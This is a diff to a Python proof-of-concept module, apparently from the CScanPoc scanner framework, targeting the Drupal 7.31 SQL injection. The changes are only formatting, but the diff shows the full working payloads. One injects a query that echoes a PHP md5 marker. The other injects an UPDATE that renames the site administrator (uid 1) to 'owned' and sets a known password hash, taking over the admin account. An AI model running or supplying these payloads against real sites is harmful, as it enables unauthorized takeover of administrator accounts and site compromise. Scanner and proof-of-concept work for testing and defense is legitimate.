@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Drupal_0005'  # 平台漏洞编号，留空
     name = 'Drupal 7.31 SQL注入'  # 漏洞名称
@@ -34,7 +35,8 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
 
             payload = '/?q=node&destination=node'
-            cookies = {'Drupal.toolbar.collapsed':'0', 'Drupal.tableDrag.showWeight':'0', 'has_js':'1'}
+            cookies = {'Drupal.toolbar.collapsed': '0',
+                       'Drupal.tableDrag.showWeight': '0', 'has_js': '1'}
             data = "name[0%20;select%20'<?php%20print(md5(c))?>'+where+uid+%3d+'1';;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
             url = self.target + payload
             r = requests.post(url, cookies=cookies, data=data)
@@ -51,9 +53,10 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #http://bobao.360.cn/news/detail/579.html
+            # http://bobao.360.cn/news/detail/579.html
             payload = '/?q=node&destination=node'
-            cookies = {'Drupal.toolbar.collapsed':'0', 'Drupal.tableDrag.showWeight':'0', 'has_js':'1'}
+            cookies = {'Drupal.toolbar.collapsed': '0',
+                       'Drupal.tableDrag.showWeight': '0', 'has_js': '1'}
             data = "name[0%20;update+users+set+name%3d'owned'+,+pass+%3d+'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld'+where+uid+%3d+'1';;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
             url = self.target + payload
             r = requests.post(url, cookies=cookies, data=data)
@@ -64,6 +67,7 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
